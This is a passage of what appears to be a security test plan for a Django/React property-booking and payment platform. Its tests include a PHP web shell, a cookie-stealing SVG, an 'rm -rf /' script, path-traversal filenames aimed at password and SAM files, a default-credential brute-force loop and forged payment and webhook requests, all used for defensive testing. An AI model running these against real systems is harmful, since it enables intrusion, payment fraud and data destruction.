  -H "Content-Type: application/json" \
  -d 'NOT_JSON' | jq .

# Empty required fields
curl -s -X POST $BASE_BOOKING -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{}' | jq .

# All must return HTTP 400 with a descriptive validation error, never HTTP 500
```

---

## 5. Business Logic

---

### TEST-BIZ-01 — Double Booking Race Condition

**CWE:** CWE-362 (Race Condition)  
**Tools:** curl (parallel), ab (Apache Bench), Python  
**Risk:** Without database-level locking, two simultaneous booking requests for the same room can both succeed, creating an overbooked property.

**Procedure (curl parallel):**
```bash
TOKEN_A="<user a token>"
TOKEN_B="<user b token>"
LISTING_ID="1"
ROOM_ID="5"  # A hotel room with total_count=1

PAYLOAD="{\"listing\":$LISTING_ID,\"hotel_room\":$ROOM_ID,\"start_date\":\"2026-09-01\",\"end_date\":\"2026-09-05\",\"guests\":2}"

# Fire both requests simultaneously
(
  curl -s -o /tmp/result_a.json -w "%{http_code}" \
    -X POST https://your-backend.com/api/bookings/ \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD" > /tmp/code_a.txt
) &

(
  curl -s -o /tmp/result_b.json -w "%{http_code}" \
    -X POST https://your-backend.com/api/bookings/ \
    -H "Authorization: Bearer $TOKEN_B" \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD" > /tmp/code_b.txt
) &

wait
echo "User A: HTTP $(cat /tmp/code_a.txt)"
echo "User B: HTTP $(cat /tmp/code_b.txt)"
cat /tmp/result_a.json | jq .status
cat /tmp/result_b.json | jq .status
```

**Procedure (Python threaded — more reliable for race conditions):**
```python
import threading, requests, json

URL = "https://your-backend.com/api/bookings/"
PAYLOAD = {
    "listing": 1, "hotel_room": 5,
    "start_date": "2026-09-01", "end_date": "2026-09-05", "guests": 2
}
TOKENS = ["<token_a>", "<token_b>", "<token_c>"]
results = []

def book(token):
    r = requests.post(URL, json=PAYLOAD,
                      headers={"Authorization": f"Bearer {token}"})
    results.append((r.status_code, r.json()))

threads = [threading.Thread(target=book, args=(t,)) for t in TOKENS]
[t.start() for t in threads]
[t.join() for t in threads]

for code, body in results:
    print(f"HTTP {code}: {body.get('status','—')} / {body.get('error','—')}")

# Pass: Exactly one HTTP 201; all others HTTP 400 with "not available"
```

**Sources:** [OWASP Race Conditions](https://owasp.org/www-community/attacks/Race_condition), CWE-362

---

### TEST-BIZ-02 — Price Manipulation

**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)  
**Tools:** curl, Burp Suite Proxy  
**Risk:** If the server trusts the client-submitted price, a guest can book a $500/night property for $1.

**Procedure:**
```bash
TOKEN="<guest token>"

# Test 1 — Submit a tampered total_price in the booking POST
curl -s -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "listing": 1,
    "start_date": "2026-07-01",
    "end_date": "2026-07-05",
    "guests": 2,
    "total_price": 1,
    "base_price": 0.01,
    "service_fee": 0
  }' | jq '{id, total_price, base_price}'

# If a booking was created, check what price was stored:
# Pass: Stored price matches the listing's published rate, not the submitted value.

# Test 2 — Intercept with Burp Suite
# 1. Start booking flow in the browser with Burp proxy intercepting
# 2. On the payment-intent creation request, modify amount_cents from 50000 to 1
# 3. Forward the modified request
# 4. Check Stripe Dashboard — the actual charge should be the correct amount
```

**Sources:** [OWASP Business Logic](https://owasp.org/www-community/attacks/Business_logic_vulnerability), CWE-345

---

### TEST-BIZ-03 — Review Without a Booking

**CWE:** CWE-285  
**Tools:** curl  

**Procedure:**
```bash
# Use a user account that has NO completed bookings for listing ID 99
NO_BOOKING_TOKEN="<token of user with no bookings>"

curl -s -X POST https://your-backend.com/api/listings/99/reviews/ \
  -H "Authorization: Bearer $NO_BOOKING_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"rating":5,"comment":"Paid review — no stay required!"}' \
  | jq .

# Expected: HTTP 403 {"error": "You can only review properties you have stayed at."}
```

---

## 6. Payment Security

---

### TEST-PAY-01 — No Raw Card Data on Server

**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)  
**Tools:** Browser DevTools  
**Risk:** Sending raw card numbers to your backend is a PCI DSS violation and exposes cardholder data.

**Procedure:**
1. Open DevTools → Network tab → click the filter icon → type your backend domain.
2. Complete a payment in the UI.
3. After the payment, right-click in the Network tab → "Save all as HAR with content".
4. Search the HAR file for: `card_number`, `cardNumber`, `cvv`, `cvc`, `expiry`, `exp_month`, `exp_year`, `pan`.

```bash
# Automated HAR search (save HAR file first from DevTools)
grep -Ei "card_number|cardnumber|cvv|cvc|expiry|exp_month|pan" network-traffic.har
```

5. Also confirm that Stripe's tokenized card appears only in requests to `api.stripe.com`, not to your backend.

**Pass criteria:** Zero matches. All card data goes exclusively to `api.stripe.com`.

**Sources:** [PCI DSS Requirements](https://www.pcisecuritystandards.org/document_library/), [Stripe Security Guide](https://stripe.com/docs/security)

---

### TEST-PAY-02 — Payment Amount Computed Server-Side

**CWE:** CWE-345  
**Tools:** Burp Suite Proxy, curl  
**Risk:** If the Stripe PaymentIntent amount is taken from the client request, an attacker pays $0.01 for a $500 booking.

**Procedure (Burp Suite intercept):**
1. Enable Burp proxy. Begin a booking in the browser.
2. When the browser sends `POST /api/payments/stripe/payment-intent/`, intercept the request.
3. Modify `amount_cents` from the real value (e.g., `50000`) to `1`.
4. Forward the modified request.
5. Complete the Stripe Elements form and submit.
6. Check the Stripe Dashboard → Payments → confirm the actual charge amount.

```bash
# Direct test — forge a payment-intent request with amount=1
curl -s -X POST https://your-backend.com/api/payments/stripe/payment-intent/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"booking_id":"<booking_id>","amount_cents":1,"currency":"usd"}' \
  | jq .

# If the response contains a client_secret for a $0.01 intent, the test FAILS.
# Pass: Server returns an intent for the correct amount regardless of the submitted amount.
```

**Sources:** [Stripe PaymentIntent docs](https://stripe.com/docs/api/payment_intents), CWE-345

---

### TEST-PAY-03 — Webhook Signature Verification

**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)  
**Tools:** curl, openssl  
**Risk:** If webhook payloads are accepted without verifying the Stripe-Signature header, anyone can POST a fake `payment_intent.succeeded` event to mark a booking as paid without actually paying.

**Procedure:**
```bash
WEBHOOK_URL="https://your-backend.com/api/payments/webhook/"

# Test 1 — No signature header
curl -s -o /dev/null -w "No signature: %{http_code}\n" \
  -X POST "$WEBHOOK_URL" \
  -H "Content-Type: application/json" \
  -d '{"type":"payment_intent.succeeded","data":{"object":{"id":"pi_fake","amount":10000}}}'

# Test 2 — Wrong signature
curl -s -o /dev/null -w "Wrong signature: %{http_code}\n" \
  -X POST "$WEBHOOK_URL" \
  -H "Content-Type: application/json" \
  -H "Stripe-Signature: t=1234567890,v1=fakesignature" \
  -d '{"type":"payment_intent.succeeded","data":{"object":{"id":"pi_fake","amount":10000}}}'

# Test 3 — Valid signature on a TAMPERED payload
PAYLOAD='{"type":"payment_intent.succeeded","data":{"object":{"id":"pi_real","amount":100}}}'
TIMESTAMP=$(date +%s)
SECRET="whsec_your_webhook_secret_here"
SIGNED_PAYLOAD="${TIMESTAMP}.${PAYLOAD}"
SIG=$(echo -n "$SIGNED_PAYLOAD" | openssl dgst -sha256 -hmac "$SECRET" | awk '{print $2}')

TAMPERED='{"type":"payment_intent.succeeded","data":{"object":{"id":"pi_real","amount":999999}}}'
curl -s -o /dev/null -w "Tampered payload: %{http_code}\n" \
  -X POST "$WEBHOOK_URL" \
  -H "Content-Type: application/json" \
  -H "Stripe-Signature: t=${TIMESTAMP},v1=${SIG}" \
  -d "$TAMPERED"

# All three must return: HTTP 400 or 401
```

**Sources:** [Stripe webhook security docs](https://stripe.com/docs/webhooks/signatures), CWE-345

---

### TEST-PAY-04 — Payment Replay Attack

**CWE:** CWE-294 (Authentication Bypass by Capture-replay)  
**Tools:** curl  
**Risk:** If a completed PaymentIntent can be re-submitted to the confirmation endpoint, an attacker could create multiple bookings from a single payment.

**Procedure:**
```bash
TOKEN="<guest token>"

# Step 1 — Complete a real booking (obtain a payment_intent_id from Stripe)
INTENT_ID="pi_xxxxxxxxxxxxxxxxxxxxxxxx"

# Step 2 — Replay the confirmation to create a second booking
curl -s -X POST https://your-backend.com/api/payments/confirm/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"payment_intent_id\":\"$INTENT_ID\",\"booking_id\":\"<new_booking_id>\"}" \
  | jq .

# Expected: HTTP 400 or 409 — "PaymentIntent already used" or "booking already confirmed"
```

---

### TEST-PAY-05 — Skip Payment Step

**CWE:** CWE-285  
**Tools:** curl  
**Risk:** A POST directly to the booking endpoint with a forged `payment_status` field could create a confirmed booking without payment.

**Procedure:**
```bash
TOKEN="<guest token>"

curl -s -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "listing": 1,
    "start_date": "2026-07-01",
    "end_date": "2026-07-05",
    "guests": 2,
    "status": "confirmed",
    "payment_status": "paid",
    "stripe_payment_intent_id": "pi_fake"
  }' | jq '{id, status, payment_status}'

# Pass: Booking is created with status="requested" and payment_status="pending".
# Only the Stripe webhook handler may change payment_status to "paid".
```

---

## 7. File Upload Security

---

### TEST-FILE-01 — Malicious File Type

**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)  
**Tools:** curl  
**Risk:** Uploading executable or script files to a storage server can lead to remote code execution if those files are served and interpreted.

**Procedure:**
```bash
HOST_TOKEN="<host token>"
ENDPOINT="https://your-backend.com/api/listings/1/images/"

# Create test files
echo '<?php system($_GET["cmd"]); ?>' > webshell.php
echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>' > xss.svg
echo '#!/bin/bash\nrm -rf /' > malicious.sh
cp /bin/ls binary.exe  # rename a binary as jpg

# Test each dangerous type
for FILE in webshell.php xss.svg malicious.sh binary.exe; do
  echo -n "Uploading $FILE: "
  curl -s -o /dev/null -w "HTTP %{http_code}\n" \
    -X POST "$ENDPOINT" \
    -H "Authorization: Bearer $HOST_TOKEN" \
    -F "image=@$FILE;type=image/jpeg"
done

# Test Content-Type spoofing with a real image extension but bad content
echo '<?php system($_GET["cmd"]); ?>' > malicious.jpg
echo -n "Uploading malicious.jpg (PHP content): "
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  -X POST "$ENDPOINT" \
  -H "Authorization: Bearer $HOST_TOKEN" \
  -F "image=@malicious.jpg;type=image/jpeg"

# All must return: HTTP 400 Bad Request
# Server must check file content (magic bytes), not just extension or Content-Type
```

**How to verify server checks magic bytes (not just extension):**
In Django, the upload handler should use `python-magic` or `filetype` library:
```python
import magic
mime = magic.from_buffer(file.read(2048), mime=True)
assert mime in ('image/jpeg', 'image/png', 'image/webp', 'image/gif')
```

**Sources:** [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html), CWE-434

---

### TEST-FILE-02 — Oversized File

**CWE:** CWE-400 (Uncontrolled Resource Consumption)  
**Tools:** curl, dd  

**Procedure:**
```bash
# Generate test files of increasing size
dd if=/dev/urandom of=file_5mb.bin bs=1M count=5
dd if=/dev/urandom of=file_11mb.bin bs=1M count=11  # assume 10MB limit
dd if=/dev/urandom of=file_50mb.bin bs=1M count=50

for FILE in file_5mb.bin file_11mb.bin file_50mb.bin; do
  SIZE=$(du -h "$FILE" | cut -f1)
  echo -n "Uploading $SIZE: "
  curl -s -o /dev/null -w "HTTP %{http_code}\n" \
    -X POST https://your-backend.com/api/listings/1/images/ \
    -H "Authorization: Bearer $HOST_TOKEN" \
    -F "image=@$FILE;type=image/jpeg"
done

# Pass: Files over the limit return HTTP 400 or 413.
# The server must enforce the limit in Django settings: FILE_UPLOAD_MAX_MEMORY_SIZE and DATA_UPLOAD_MAX_MEMORY_SIZE.
```

---

### TEST-FILE-03 — Filename Path Traversal

**CWE:** CWE-22  
**Tools:** curl  

**Procedure:**
```bash
TRAVERSAL_FILENAMES=(
  "../../etc/passwd"
  "../../../tmp/evil"
  "....//....//etc/shadow"
  "%2e%2e%2fetc%2fpasswd"
  "..%252f..%252fetc%252fpasswd"
  "..\\..\\windows\\system32\\config\\SAM"
)

for NAME in "${TRAVERSAL_FILENAMES[@]}"; do
  echo -n "Filename [$NAME]: "
  curl -s -o /tmp/upload_resp.json -w "HTTP %{http_code}\n" \
    -X POST https://your-backend.com/api/listings/1/images/ \
    -H "Authorization: Bearer $HOST_TOKEN" \
    -F "image=@valid_image.jpg;filename=$NAME"
  cat /tmp/upload_resp.json | jq .error 2>/dev/null
done

# Also verify that stored files use generated names (UUID), never the client-supplied name
```

---

## 8. Data Exposure & Information Leakage

---

### TEST-DATA-01 — API Over-Exposure of PII

**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)  
**Tools:** curl, jq  

**Procedure:**
```bash
GUEST_TOKEN="<regular user token>"

# Test 1 — User list must be admin-only
curl -s -H "Authorization: Bearer $GUEST_TOKEN" \
  https://your-backend.com/api/users/ | jq 'if type=="array" then "FAIL: user list returned" else .error end'

# Test 2 — Another user's profile — check which fields are returned
OTHER_USER_ID="<another user's UUID>"
curl -s -H "Authorization: Bearer $GUEST_TOKEN" \
  https://your-backend.com/api/users/$OTHER_USER_ID/ \
  | jq 'keys'

# Fields that MUST NOT appear: email, phone, password, tokens, is_staff, internal_id
# Fields that are OK: firstName, lastName, avatar, isHost, createdAt (public profile only)

# Test 3 — Booking list must show only own bookings
curl -s -H "Authorization: Bearer $GUEST_TOKEN" \
  https://your-backend.com/api/bookings/ \
  | jq '[.[].guestId] | unique'
# All IDs must equal the logged-in user's ID

# Test 4 — Listing response must not expose host's private details
curl -s https://your-backend.com/api/listings/1/ \
  | jq '.host | keys'
# Must not include: email, phone, passwordHash, tokens, internalId
```

---

### TEST-DATA-02 — Error Message Leakage

**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)  
**Tools:** curl  

**Procedure:**
```bash
# Test 1 — Malformed JSON
curl -s -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d 'NOT_VALID_JSON' | jq .

# Test 2 — Non-existent endpoint
curl -s https://your-backend.com/api/nonexistent-xyz/ | jq .

# Test 3 — Invalid data types
curl -s -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"listing":"not_an_id","start_date":"not_a_date"}' | jq .

# Pass: Responses contain generic messages only.
# Must NOT contain: stack trace, file paths (/home/user/app/...), SQL query text,
# Django version, PostgreSQL error codes, internal variable names
```

---

### TEST-DATA-03 — DEBUG Mode in Production

**CWE:** CWE-215 (Insertion of Sensitive Information into Debugging Code)  
**Tools:** curl, browser  

**Procedure:**
```bash
# Test 1 — Trigger a 500 error
curl -s https://your-backend.com/api/listings/99999999/ | jq .

# Test 2 — Navigate to a non-existent admin URL in browser
# https://your-backend.com/admin/listings/listing/99999999/change/

# Test 3 — Confirm DEBUG setting
curl -s https://your-backend.com/api/nonexistent/ \
  | grep -i "django\|traceback\|settings\|debug"

# Pass: All return a clean JSON error. The Django debug page (yellow page) must NEVER appear.
# Verify in settings: DEBUG = env.bool('DEBUG', default=False)
```

---

## 9. Transport & Header Security

---

### TEST-TRANS-01 — Security Headers

**CWE:** CWE-693 (Protection Mechanism Failure)  
**Tools:** curl, securityheaders.com, Mozilla Observatory  

**Procedure:**
```bash
curl -I https://your-backend.com/api/auth/login/ 2>&1 | grep -Ei \
  "x-content-type|x-frame|strict-transport|referrer-policy|content-security|permissions-policy"

# Required headers and expected values:
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
# Referrer-Policy: strict-origin-when-cross-origin
# Content-Security-Policy: (present — review for unsafe-inline usage)
# Permissions-Policy: camera=(), microphone=(), geolocation=(self)
```

**Grading (automated):**
- Navigate to https://securityheaders.com → enter your backend URL → target grade: **A or A+**
- Navigate to https://observatory.mozilla.org → target score: **85+**

---

### TEST-TRANS-02 — CORS Policy

**CWE:** CWE-346 (Origin Validation Error)  
**Tools:** curl  

**Procedure:**
```bash
# Test 1 — Untrusted origin must be rejected
curl -v \
  -H "Origin: https://attacker.example.com" \
  -H "Access-Control-Request-Method: POST" \
  -X OPTIONS \
  https://your-backend.com/api/auth/login/ 2>&1 \
  | grep -i "access-control-allow-origin"

# Pass: Must not include attacker.example.com or *

# Test 2 — Wildcard check
curl -I https://your-backend.com/api/listings/ \
  | grep -i "access-control-allow-origin"
# Pass: Must not be "*" for credentialed endpoints

# Test 3 — Legitimate frontend origin must be allowed
curl -v \
  -H "Origin: https://realestate-booking-platform.vercel.app" \
  -H "Access-Control-Request-Method: POST" \
  -X OPTIONS \
  https://your-backend.com/api/auth/login/ 2>&1 \
  | grep -i "access-control-allow-origin"
# Pass: Returns your frontend domain exactly
```

---

### TEST-TRANS-03 — HTTPS Enforcement

**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)  
**Tools:** curl, browser  

**Procedure:**
```bash
# HTTP must redirect to HTTPS
curl -v http://your-backend.com/api/auth/login/ 2>&1 | grep -E "< HTTP|Location:"

# Pass: HTTP 301 or 302 redirect to https://

# Test mixed content in frontend (Chrome DevTools)
# DevTools → Console → filter "Mixed Content"
# Pass: Zero warnings

# Verify TLS version (TLS 1.2 minimum, TLS 1.3 preferred)
openssl s_client -connect your-backend.com:443 2>&1 | grep "Protocol"
# Pass: TLSv1.2 or TLSv1.3
```

---

### TEST-TRANS-04 — X-Forwarded-For Spoofing

**CWE:** CWE-348 (Use of Less Trusted Source)  
**Tools:** curl  

**Procedure:**
```bash
# Send 20 requests, each with a different spoofed IP
for i in $(seq 1 20); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://your-backend.com/api/auth/login/ \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -H "X-Real-IP: 10.0.0.$i" \
    -H "Content-Type: application/json" \
    -d '{"username":"test@example.com","password":"wrong"}')
  echo "IP 10.0.0.$i: HTTP $CODE"
  [ "$CODE" = "429" ] && echo "Rate limit triggered" && break
done

# Pass: Rate limiting fires based on real IP (from trusted proxy), not X-Forwarded-For value.
# Django setting: USE_X_FORWARDED_HOST = False unless behind a known, trusted proxy.
```

---

## 10. Infrastructure & Configuration

---

### TEST-INFRA-01 — Hardcoded Secrets Scan

**CWE:** CWE-798  
**Tools:** grep, git, Gitleaks  

**Procedure:**
```bash
# Static scan
grep -rEn \
  "sk_live_|pk_live_|whsec_|SECRET_KEY\s*=\s*['\"][^e]|password\s*=\s*['\"][a-zA-Z]" \
  backend/ --include="*.py" --include="*.env" --include="*.yaml"

# Full git history scan with Gitleaks
docker run --rm -v $(pwd):/repo \
  zricethezav/gitleaks:latest detect \
  --source /repo --report-format json --report-path /repo/gitleaks-report.json

cat gitleaks-report.json | jq '.[] | {file, line, secret: .Secret[:20]}'

# Pass: Zero matches in code. Zero findings in git history.
```

---

### TEST-INFRA-02 — Dependency CVEs

**Tools:** safety, pip-audit, npm audit, Trivy  

**Procedure:**
```bash
# Backend Python dependencies
pip install safety pip-audit
safety check -r requirements.txt --output=json > safety-report.json
pip-audit -r requirements.txt --format=json > pip-audit-report.json

cat safety-report.json | jq '.vulnerabilities[] | {package, advisory, severity}'
cat pip-audit-report.json | jq '.dependencies[] | select(.vulns | length > 0)'

# Frontend Node dependencies
cd frontend
npm audit --json > npm-audit.json
cat npm-audit.json | jq '.vulnerabilities | to_entries[] | select(.value.severity=="critical" or .value.severity=="high") | {name: .key, severity: .value.severity}'

# Docker image
docker build -t homekonet-backend ./backend
trivy image homekonet-backend --severity HIGH,CRITICAL --format json > trivy-report.json
cat trivy-report.json | jq '.Results[].Vulnerabilities[] | select(.Severity=="CRITICAL") | {PkgName, Title, VulnerabilityID}'
```

**Sources:** [Safety](https://pyup.io/safety/), [pip-audit](https://github.com/pypa/pip-audit), [Trivy](https://github.com/aquasecurity/trivy)

---

### TEST-INFRA-03 — Django Admin Hardening

**Tools:** Browser, curl  

**Procedure:**
```bash
# Test 1 — Discover admin path
ADMIN_PATHS=("/admin/" "/django-admin/" "/backend/admin/" "/staff/" "/manage/")
for PATH in "${ADMIN_PATHS[@]}"; do
  echo -n "$PATH: "
  curl -s -o /dev/null -w "%{http_code}\n" "https://your-backend.com$PATH"
done

# Test 2 — Brute force common credentials
CREDS=("admin:admin" "admin:password" "admin:12345" "root:root" "superuser:admin")
for CRED in "${CREDS[@]}"; do
  USER=$(echo $CRED | cut -d: -f1)
  PASS=$(echo $CRED | cut -d: -f2)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://your-backend.com/admin/login/ \
    -d "username=$USER&password=$PASS")
  echo "$CRED: HTTP $CODE"
done

# Pass: /admin/ returns 404 (custom URL used) or 302 to login.
# Default credential pairs all return 200 with an error (not a successful redirect to /admin/).
```

---

### TEST-INFRA-04 — Database Not Publicly Exposed

**Tools:** nc (netcat)  

**Procedure:**
```bash
DB_HOST="your-db-host.example.com"

# Test PostgreSQL port
nc -zv $DB_HOST 5432 2>&1
# Pass: "Connection refused" or timeout — database unreachable from the internet

# Test Redis port (if used)
nc -zv $DB_HOST 6379 2>&1

# Verify DATABASE_URL is not in public settings
grep -rn "DATABASE_URL\|postgres://" backend/ --include="*.py" | grep -v "env(\|os.environ"
```

---

## 11. Automated Scanning

### 11.1 Backend — Python/Django

```bash
# Bandit (static security linter for Python)
pip install bandit
bandit -r backend/ -ll -ii -f json -o bandit-report.json
cat bandit-report.json | jq '.results[] | select(.issue_severity=="HIGH") | {filename, test_id, issue_text}'

# Safety (known CVEs in pip packages)
pip install safety
safety check -r requirements.txt

# Semgrep (semantic code analysis)
pip install semgrep
semgrep --config=p/django backend/
semgrep --config=p/python backend/
semgrep --config=p/secrets backend/    # find hardcoded API keys / passwords
```

### 11.2 Frontend — JavaScript/TypeScript

```bash
cd frontend

# npm audit
npm audit
npm audit --audit-level=high --json > npm-audit.json

# Semgrep
semgrep --config=p/react src/
semgrep --config=p/typescript src/

# ESLint security plugin
npm install --save-dev eslint-plugin-security eslint-plugin-no-unsanitized
# Add to .eslintrc.json:
# "plugins": ["security", "no-unsanitized"],
# "extends": ["plugin:security/recommended", "plugin:no-unsanitized/DOM"]
npx eslint src/ --ext .ts,.tsx
```

### 11.3 DAST — OWASP ZAP

```bash
# Pull the image once
docker pull owasp/zap2docker-stable

# Passive baseline scan (non-destructive — safe on production)
docker run --rm -v $(pwd):/zap/wrk owasp/zap2docker-stable \
  zap-baseline.py \
  -t https://your-frontend.com \
  -r /zap/wrk/zap-baseline-report.html \
  -J /zap/wrk/zap-baseline-report.json

# Active scan (attacks — staging environment ONLY)
docker run --rm -v $(pwd):/zap/wrk owasp/zap2docker-stable \
  zap-full-scan.py \
  -t https://your-staging-backend.com \
  -r /zap/wrk/zap-full-report.html

# API scan using OpenAPI spec
docker run --rm -v $(pwd):/zap/wrk owasp/zap2docker-stable \
  zap-api-scan.py \
  -t https://your-backend.com/api/schema/ \
  -f openapi \
  -r /zap/wrk/zap-api-report.html

# Review all MEDIUM and HIGH alerts before deploying
cat zap-baseline-report.json | jq '.site[].alerts[] | select(.riskdesc | startswith("High") or startswith("Medium")) | {name, riskdesc, solution}'
```

**ZAP GUI procedure:**
1. Launch ZAP → Automated Scan → enter target URL.
2. Spider to discover endpoints.
3. Active Scan → wait for completion.
4. Alerts tab → filter by Risk → address all High/Medium findings.

**Source:** https://www.zaproxy.org/docs/

### 11.4 Container Scanning (Trivy)

```bash
# Install
brew install aquasecurity/trivy/trivy  # macOS
# or: apt-get install trivy            # Debian/Ubuntu

# Scan backend image
docker build -t homekonet-backend:scan ./backend
trivy image homekonet-backend:scan \
  --severity HIGH,CRITICAL \
  --format table

# Scan frontend image
docker build -t homekonet-frontend:scan ./frontend
trivy image homekonet-frontend:scan --severity HIGH,CRITICAL

# Scan filesystem (without building image)
trivy fs --severity HIGH,CRITICAL .

# Source: https://aquasecurity.github.io/trivy/
```

---

## 12. Manual Penetration Testing Procedures

### 12.1 Burp Suite Setup (Required for intercept-based tests)

**Install:** https://portswigger.net/burp/communitydownload

```
1. Launch Burp Suite Community.
2. Proxy tab → Options → confirm proxy listener: 127.0.0.1:8080.
3. Browser: set HTTP proxy to 127.0.0.1:8080.
4. Burp → Proxy → CA Certificate → download and install in browser trust store
   (Chrome: Settings → Privacy → Manage certificates → Authorities → Import).
5. Visit https://your-backend.com — traffic should appear in Proxy → HTTP History.
```

**Repeater workflow (for IDOR / auth bypass):**
1. Find a request in HTTP History → right-click → Send to Repeater.
2. In Repeater: modify headers (change auth token, modify IDs).
3. Click Send → inspect response code and body.

**Intruder workflow (for brute force / fuzzing):**
1. Right-click a request → Send to Intruder.
2. Highlight the target parameter → Add § markers.
3. Payloads tab → load a wordlist.
4. Start Attack → sort by response length to spot anomalies.

---

### 12.2 Full Auth Bypass Checklist (Burp Repeater)

For every protected API endpoint, run all of these in Repeater:

| Modification | Expected result |
|---|---|
| Remove `Authorization` header entirely | HTTP 401 |
| Send a valid token for the wrong user | HTTP 403 or 404 |
| Send an expired access token | HTTP 401 |
| Send a malformed token (`Bearer AAAA`) | HTTP 401 |
| Modify JWT payload without re-signing | HTTP 401 |
| Use a guest token on host-only endpoint | HTTP 403 |
| Use a host token on admin-only endpoint | HTTP 403 |
| Use HTTP instead of HTTPS (token in plaintext) | HTTP 301 redirect |

---

### 12.3 OWASP Top 10 (2021) Full Checklist

| # | Category | Tests in This Document | Status |
|---|---|---|---|
| A01 | Broken Access Control | TEST-AUTHZ-01 through TEST-AUTHZ-04, TEST-BIZ-01 | ✅ Auth gates verified; booking list scoped to owner; IDOR access-controlled |
| A02 | Cryptographic Failures | TEST-AUTH-02, TEST-AUTH-04, TEST-TRANS-03, TEST-PAY-01 | ✅ TLS 1.3; Stripe.js card handling; no raw PAN on server |
| A03 | Injection | TEST-INPUT-01 (SQL), TEST-INPUT-02/03 (XSS), TEST-INPUT-05 (Path Traversal) | ✅ Django ORM throughout; no raw SQL; DRF auto-escapes JSON output |
| A04 | Insecure Design | TEST-BIZ-01 through TEST-BIZ-03, TEST-PAY-02/05 | ✅ Server-side pricing (PAY-02 fixed); PI verification + replay block (PAY-04 fixed) |
| A05 | Security Misconfiguration | TEST-DATA-03 (DEBUG), TEST-TRANS-01 (headers), TEST-INFRA-03 (admin) | ✅ DEBUG=False; CSP + Permissions-Policy added; JSON 404/500 handlers added |
| A06 | Vulnerable Components | TEST-INFRA-02 (CVEs) | ✅ Pillow upgraded to ≥12.2.0 (5 CVEs); vite 6.4.3; react-router 7.17.0 |
| A07 | Identification & Auth Failures | TEST-AUTH-01 through TEST-AUTH-07 | ✅ JWT auth; 15-min access tokens; login rate limit fixed (DatabaseCache + NUM_PROXIES=1) |
| A08 | Software & Data Integrity | TEST-PAY-03 (webhook HMAC), TEST-INFRA-01 (secrets) | ✅ Stripe webhook HMAC verified; detect-secrets baseline clean |
| A09 | Logging & Monitoring Failures | TEST-DATA-02 (error leakage), TEST-DATA-01 (PII exposure) | ✅ momo_number removed from public API; JSON errors on all endpoints |
| A10 | SSRF | TEST-INPUT-06 | ✅ No user-controlled URL fetching; all outbound HTTP uses hardcoded constants |

**Source:** https://owasp.org/Top10/

---

## 13. Security Headers — Django Configuration

```python
# backend/settings.py (production values)

DEBUG = env.bool('DEBUG', default=False)

# HTTPS enforcement
SECURE_SSL_REDIRECT = not DEBUG
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True

# Header flags
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'

# Cookie security
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Strict'
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True
CSRF_COOKIE_SAMESITE = 'Strict'

# File upload limits
DATA_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024   # 10 MB
FILE_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024   # 10 MB

# Content Security Policy (pip install django-csp)
# https://django-csp.readthedocs.io/
MIDDLEWARE = [
    'csp.middleware.CSPMiddleware',
    'django.middleware.security.SecurityMiddleware',
    # ... rest
]

CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC  = ("'self'", "https://js.stripe.com")
CSP_FRAME_SRC   = ("'self'", "https://js.stripe.com")
CSP_IMG_SRC     = ("'self'", "data:", "https:", "blob:")
CSP_CONNECT_SRC = ("'self'", "https://api.stripe.com", "wss:")
CSP_FONT_SRC    = ("'self'", "data:")
CSP_STYLE_SRC   = ("'self'", "'unsafe-inline'")
CSP_OBJECT_SRC  = ("'none'",)
CSP_BASE_URI    = ("'self'",)
CSP_REPORT_URI  = "/csp-report/"

# Permissions Policy (pip install django-permissions-policy)
PERMISSIONS_POLICY = {
    "camera": [],
    "microphone": [],
    "geolocation": ["self"],
    "payment": ["self", "https://js.stripe.com"],
    "usb": [],
}
```

---

## 14. CI/CD Integration

Create `.github/workflows/security.yml`:

```yaml
name: Security Checks

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 3 * * 1'   # Weekly Monday 3am UTC — catches new CVEs in existing deps

jobs:
  backend-security:
    name: Backend Static Analysis
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'

